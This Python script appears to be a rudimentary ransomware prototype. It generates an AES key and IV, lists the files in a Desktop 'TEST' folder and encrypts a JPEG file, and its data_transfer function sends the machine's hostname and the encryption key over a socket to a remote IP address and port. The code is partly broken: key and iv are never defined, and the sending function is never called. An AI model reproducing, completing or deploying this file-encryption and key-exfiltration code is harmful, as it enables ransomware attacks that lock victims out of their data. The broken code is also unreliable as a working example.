import os
import random
from Crypto.Cipher import AES
import base64
import socket


# KEY GENERATION
def generate_key(size):
    key = ''
    for i in range(int(size)):
        key += chr(random.randint(33, 127))
    return key


# IV GENERATION
def generate_iv():
    iv = ''
    for i in range(16):
        iv += chr(random.randint(33, 127))
    return iv


# ENCRYPTION
def aes_encrypt(key, iv, message):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    aes = AES.new(key, AES.MODE_CBC, iv)
    encrypted = aes.encrypt(message)
    encrypted_base64 = base64.b64encode(encrypted).decode()
    return encrypted_base64


# DECRYPTION
def aes_decrypt(key, iv, cipher_bs64):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    cipher = base64.b64decode(cipher_bs64)
    des = AES.new(key, AES.MODE_CBC, iv)
    decrypted = des.decrypt(cipher).decode()
    return decrypted


# PADDING
def pad(size, data):
    pads = size - (len(data) % size)
    data += bytes(chr(pads) * pads, encoding="utf8")
    return data


# UNPADDING
def unpad(text):
    return text[:-ord(text[-1])]


# FILE LISTING
directory = os.environ['USERPROFILE'] + '\\Desktop' + '\\TEST'
files = os.listdir(directory)
abs_files = []
for f in files:
    abs_files.append(f'{directory}\\{f}')

hostname = os.getenv('COMPUTERNAME')
IP_ADDRESS = '192.168.162.190'
PORT = 5678


# DATA TRANSFER
def data_transfer(key):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP_ADDRESS, PORT))
            print('Successfully connected... transmitting hostname and key')
            s.send(f'{hostname} : {key}'.encode('utf-8'))
            print('Finished transmitting data!!')
            s.close()
    except:
        pass

    
with open('WhatsApp Image 2022-03-06 at 8.10.15 PM-2.jpeg', 'rb') as f:
    file_data = f.read()
    encrypted = aes_encrypt(key, iv, file_data)

with open('encrypted_text', 'wb') as f1:
    f1.write(encrypted)

with open('encrypted_text', 'rb') as f2:
    encoded_and_encrypted = f2.read()
    decrypted_pad = aes_decrypt(key, iv, encoded_and_encrypted)

with open('new_image.jpeg', 'wb') as f3:
    f3.write(decrypted_pad)
